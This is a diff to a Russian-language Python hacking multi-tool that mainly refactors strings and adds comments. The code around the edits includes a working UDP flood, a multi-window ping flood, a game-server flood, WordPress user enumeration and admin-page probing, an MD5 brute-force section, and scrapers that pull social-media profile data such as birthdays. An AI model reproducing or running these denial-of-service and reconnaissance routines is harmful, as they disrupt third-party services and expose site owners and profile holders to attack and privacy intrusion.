@@ -47,33 +47,33 @@ def art():
 
 #checker section
 def checker(url):
-    getbrowser = 'https://check-host.net/check-http?host=' + url
+    getbrowser = f'https://check-host.net/check-http?host={url}'
     webbrowser.open(getbrowser, new=2)
     print('Готово!')
 
 #ping section
 def ping(host):
     packets = input('Размер пакетов: ')
-    threads = int(input('Количество окон: '))
+    threads = int(input('Количество потоков: '))
     for i in range(threads):
-        os.system('start ping ' + host + ' -l ' + packets + ' -t')
+        os.system(f'start ping {host} -l {packets} -t')
 
 #tiktok parsing section
 def tiktokparsing(username):
-    link = 'https://socialblade.com/tiktok/user/' + username
+    url = f'https://socialblade.com/tiktok/user/{username}' #статистика socialblade
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
         'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3'
     }
-    response = requests.get(link, headers=headers)
+    response = requests.get(url, headers=headers)
     soup = BeautifulSoup(response.text, 'lxml')
     if soup.find('div', attrs={'style': 'width: 800px; padding: 40px; background: #ddac99; margin: 0px auto; color:#fff; text-align: center; font-weight: bold;'}) is not None:
         print(Fore.RED + 'У этого аккаунта меньше 25000 тысяч подписчиков, поэтому его нет в базе данных.')
     else:
         unwanted = soup.find('div', attrs={'style': 'float: right; opacity: 0.7; font-weight: bold;'})
-        unwanted.extract()
+        unwanted.extract() #выбрасывает ненужный код html
         infos = soup.find_all('div', class_='YouTubeUserTopInfo')
-        counts = []
+        counts = [] #данные наполняются в пустой массив
 
         for i in infos:
             itemName = i.find('span', class_='YouTubeUserTopLight')
@@ -84,8 +84,7 @@ def tiktokparsing(username):
         saveit = input('Сохранить в TXT файл? (y or n): ')
         if saveit == 'Y' or saveit == 'y':
             with open('TikTokData.txt', 'w') as file:
-                file.write('Username: ' + username + '\n' + '\n'.join(counts))
-                file.close()
+                file.write(f'Username: {username}\n' + '\n'.join(counts))
 
 #vk parsing section
 def vkparsing(url):
@@ -97,7 +96,7 @@ def vkparsing(url):
     soup = BeautifulSoup(response.text, 'lxml')
     name = soup.find('h1', class_='page_name').text
     infos = soup.find_all('a', class_='page_counter')
-    counts = []
+    counts = [] #данные наполняются в пустой массив
     print(name)
 
     for i in infos:
@@ -108,8 +107,7 @@ def vkparsing(url):
     saveit = input('Сохранить в TXT файл? (y or n): ')
     if saveit == 'Y' or saveit == 'y':
         with open('VKdata.txt', 'w') as file:
-            file.write('URL: ' + url + '\n' + '\n'.join(counts))
-            file.close()
+            file.write(f'URL: {url}\n' + '\n'.join(counts))
 
 #ok parsing section
 def okparsing(url):
@@ -123,17 +121,16 @@ def okparsing(url):
     groups = soup.find('a', attrs={"data-l": "outlandermenu,friendAltGroup"}).find('span')
     games = soup.find('a', attrs={"data-l": "outlandermenu,friendApps"}).find('span')
 
-    print('Пользователь: ' + name.text)
-    print('Дата рождения: ' + birthday.text)
-    print('Количество друзей: ' + friends.text)
-    print('Количество групп: ' + groups.text)
-    print('Количество фотографий: ' + photo.text)
-    print('Количество игр: ' + games.text)
+    print(f'Пользователь:  {name.text}')
+    print(f'Дата рождения: {birthday.text}')
+    print(f'Количество друзей: {friends.text}')
+    print(f'Количество групп: {groups.text}')
+    print(f'Количество фотографий: {photo.text}')
+    print(f'Количество игр: {games.text}')
     saveit = input('Сохранить в TXT файл? (y or n): ')
     if saveit == 'Y' or saveit == 'y':
         with open('OKdata.txt', 'w') as file:
-            file.write('URL: ' + url + '\nПользователь: ' + name.text + '\nДата рождения: ' + birthday.text + '\nКоличество друзей: ' + friends.text + '\nКоличество групп: ' + groups.text + '\nКоличество фотографий: ' + photo.text + '\nКоличество игр: ' + games.text)
-            file.close()
+            file.write(f'URL: {url}\nПользователь: {name.text}\nДата рождения: {birthday.text}\nКоличество друзей: {friends.text}\nКоличество групп: {groups.text}\nКоличество фотографий: {photo.text}\nКоличество игр: {games.text}')
 
 #udp flood section
 def launchudp(ip, port, thread, t):
@@ -148,7 +145,7 @@ def launchudp(ip, port, thread, t):
 def attackudp(ip, port, until_datetime):
     data = random._urandom(1024)
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        i = random.choice(('[*]', '[!]', '[#]'))
+        i = random.choice(('[*]', '[&]', '[#]'))
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             addr = (str(ip), int(port))
@@ -161,7 +158,7 @@ def attackudp(ip, port, until_datetime):
 #wordpress section
 def UrlTools(Url):
     if Url.lower().startswith('https://') or Url.lower().startswith('http://'):
-        Url = Url.replace('http://','').replace('https://','')
+        Url = Url.replace('http://','').replace('https://','') #убирает https:// или http:// в начале ссылки
     return Url
 
 def getusernamewordpress(Url):
@@ -170,7 +167,7 @@ def getusernamewordpress(Url):
     'Content-Type':'application/x-www-form-urlencoded',
     'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
     }
-    r = requests.get(Url+'/wp-json/wp/v2/users/',headers=Headers).text
+    r = requests.get(f'{Url}/wp-json/wp/v2/users/',headers=Headers).text
     j = json.loads(r)
     Count = len(j) - 1
     cn = 0
@@ -188,12 +185,12 @@ def getusernamewordpress(Url):
     return User
 
 def adminpage(Url):
-    r = requests.get(Url+'/wp-admin',allow_redirects=False)
+    r = requests.get(f'{Url}/wp-admin', allow_redirects=False)
     AdminPageuRL = ''
     if r.status_code == 200:
         AdminPageuRL = Fore.RED + 'Не найдено!'
     elif r.status_code == 301:
-        AdminPageuRL = Fore.GREEN + '   ' + Url +'/wp-admin'
+        AdminPageuRL = Fore.GREEN + '   ' + f'{Url}/wp-admin'
     return AdminPageuRL
 
 def infoaboutwebsite(Url):
@@ -221,10 +218,10 @@ def infoaboutwebsite(Url):
 def wordpressgetinfo(Target):
     Url = UrlTools(Target).title()
     Ip = socket.gethostbyname(Url)
-    Username = Fore.YELLOW + '[+] '+'Пользователи: \n' + getusernamewordpress('http://' + Url)
-    AdminpageUrl = Fore.YELLOW + '[+] '+'Админка: \n' + adminpage('http://' + Url)
-    Infowebsite = Fore.YELLOW + '[+] '+'Информация: \n' + infoaboutwebsite('http://' + Url)
-    print(Fore.RED + 'Домен: ' + Url + '\nIP: ' + Ip + '\n' + Infowebsite + '\n' + Username + '\n' + AdminpageUrl)
+    Username = Fore.YELLOW + '[+] Пользователи: \n' + getusernamewordpress(f'http://{Url}')
+    AdminpageUrl = Fore.YELLOW + '[+] Админка: \n' + adminpage(f'http://{Url}')
+    Infowebsite = Fore.YELLOW + '[+] Информация: \n' + infoaboutwebsite(f'http://{Url}')
+    print(Fore.RED + f'Домен: {Url}\nIP: {Ip}\n{Infowebsite}\n{Username}\n{AdminpageUrl}') #вывод информации
 
 #Brute MD5 Section
 def computeMD5hash(string):
@@ -316,7 +313,7 @@ def csgoflood(port):
                     time.sleep(timer)
             else:
                 sys.exit(0)
-    except:
+    except ConnectionRefusedError:
         print('Хост не найден!')
 
 art()
